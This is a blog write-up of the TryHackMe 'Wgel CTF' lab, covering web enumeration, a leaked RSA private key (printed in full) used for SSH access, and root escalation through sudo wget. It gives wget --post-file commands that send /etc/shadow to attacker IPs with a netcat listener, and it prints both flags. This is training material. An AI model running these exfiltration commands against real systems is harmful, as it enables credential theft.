---
title: Wgel CTF (Try Hack Me)
author: Robin Goyal
date: 2021-09-09 18:30 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

Performing an nmap scan of the top 1000 ports for this target, we come across two accessible ports:
- 22 (SSH)
- 80 (HTTP)

![nmap results](/assets/img/posts/thm-wgel-ctf/nmap.jpg)

From the service information for the two open ports, the target is an Ubuntu Linux OS. Let's enumerate those services further.

### HTTP

The http-title nmap script reveals that the title of the web application is the default Apache landing page title. Let's check out the page to confirm this.

![80 default landing](/assets/img/posts/thm-wgel-ctf/80-landing.jpg)

Turns out the http-title script did not lie to us. There is no interesting information revealed within this page but looking deeper into the page source, and we come across some leaked information in the source code.

![80 default source](/assets/img/posts/thm-wgel-ctf/80-landing-source.jpg)

Despite it being riddled with spelling mistakes, we can deduce two critical pieces of information:
- the website has not been updated meaning there may be some vulnerabilities or information
- there is potentially a user (jessie or Jessie) that could be useful for brute forcing the SSH service or provide access to a protected endpoint

Let's now proceed with directory enumeration using gobuster.

![80 gobuster results](/assets/img/posts/thm-wgel-ctf/80-gobuster.jpg)

Browsing to the /sitemap endpoint, we're presented with another landing page.

![80 sitemap landing](/assets/img/posts/thm-wgel-ctf/80-sitemap-landing.jpg)

Let's obtain a more concrete picture of the application and perform another directory enumeration scan before we manually enumerate the UNAPP application.

**Note**: gobuster is not a recursive tool so we have to perform this for each endpoint we may across.

![80 gobuster sitemap results](/assets/img/posts/thm-wgel-ctf/80-gobuster-sitemap.jpg)

Whoa! We may not even have to browse the application at all. The .ssh directory looks very promising!

![80 ssh index listing](/assets/img/posts/thm-wgel-ctf/80-ssh-index.jpg)

## Initial Foothold

The contents of id_rsa is a private key that may just be our foothold into the target.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

Since we enumerated the web application thoroughly at the beginning, this private key may belong to Jessie. Fingers crossed!

Before we can use the private key, we need to modify the permissions to 600 so that SSH doesn't complain.

![80 ssh error](/assets/img/posts/thm-wgel-ctf/80-ssh-error.jpg)

The permission scheme when you first create a file is 644 but SSH complains that the file is world-readable so it ignores the private key.

![80 ssh success](/assets/img/posts/thm-wgel-ctf/80-ssh-success.jpg)

Success! Our intuition turned out to be correct. The private key was valid for jessie. Once we modified the permissions for the private key, SSH stopped complaining, and we obtained our foothold into the target.

![user flag](/assets/img/posts/thm-wgel-ctf/user-flag.jpg)

The user flag is located at /home/jessie/Documents/user_flag.txt. Now we can move onto privilege escalation!

User Flag: `057c67131c3d5e42dd5cd3075b198ff6`

## Privilege Escalation

First technique for privesc is to the check the superuser privilege for jessie.

![sudo privileges](/assets/img/posts/thm-wgel-ctf/sudo-privs.jpg)

The first of two items means that jessie can execute all commands as sudo so long as a password is provided. This won't work since we obtained access to the system using key-based authentication and not password authentication. However, the wget command can be executed as root without a password.

Gtfobins, a fantastic resource for privesc, should have an entry on how we can abuse this.

![gtfobins](/assets/img/posts/thm-wgel-ctf/gtfobins.jpg)

In this case, gtfobins was not that useful to us. Performing a bit of google-fu and we come across a great article by hackingarticles on how to exfil data using privileged wget [^wget].

The example in the articles uses the following command to exfil the /etc/shadow file.

`sudo /user/bin/wget --post-file=/etc/shadow 192.168.1.17`

In our situation, we should be able to transfer the /etc/shadow and /etc/passwd file to our attacker machine, and crack the password using John the Ripper. Alternatively, we could exfil the /root/root_flag.txt (assuming this is the pattern since the user flag was user_flag.txt) file in the /root folder but let's see if we can crack jessie's password using JTR and obtain root access.

![exfil](/assets/img/posts/thm-wgel-ctf/exfil.jpg)

Once I set up a netcat listener on port 80 redirecting any data received to a file called `passwd`, I use the wget command to post the file to our listener. Once the connection is established, the wget command will be expecting a valid HTTP response but we don't care about providing that so we can kill the netcat listener and our file will be saved to disk. The file contains the HTTP headers as part of the request so we'll take care to delete those.

Now we'll perform the same thing for the /etc/shadow file and use John the Ripper to try to crack the hash.

![unshadow](/assets/img/posts/thm-wgel-ctf/unshadow.jpg)

We only care about the jessie user so I filtered out the lines that didn't matter and used the unshadow command to combine the two into a file that John the Ripper will understand.

Since this was a sha512crypt hash with 5000 rounds, it took over an hour to go through the entire rockyou wordlist. At the end of it, there was no match.

*Knowing that I could already get the root flag easily, I decided to look at a few writeups to see if they tried to crack jessie's hashed password and all of them used wget to read or exfil the flag.*

![root flag](/assets/img/posts/thm-wgel-ctf/root-flag.jpg)

We have completed this room!

Root Flag: `b1b968b37519ad1daa6408188649263d`

## Useful Commands

### Data Exfil using Wget and Netcat

Create a netcat listener on port 80 saving the received data to a file.

`nc -nvlp 80 > file.txt`

Wget command to exfiltrate the data to your netcat listener.

`wget --post-file=/etc/shadow 10.6.5.103`

## Reflection

The first time I completed this room, I did not search through the source code of that default Apache page so I did not have knowledge of the user "jessie". I think I've learned my lesson as my first instinct even with the default Apache page is to search through all page sources for any information leakage.

If you don't fall into any rabbit holes, this room can be fairly straightforward. This is the first room I've come across where wget is a binary that is able to run as sudo so I enjoyed learning the number of things I can do to exfiltrate data or read local files.

*So far, this journey to document all of my previously completed rooms has surprised me on how much I have learned. I have a long way to go but I've become very comfortable solving the easy rooms on Try Hack Me. Once I complete these old writeups, I think it's definitely time I upgraded to the Medium rated rooms.*

## References

[^wget]: <https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/>
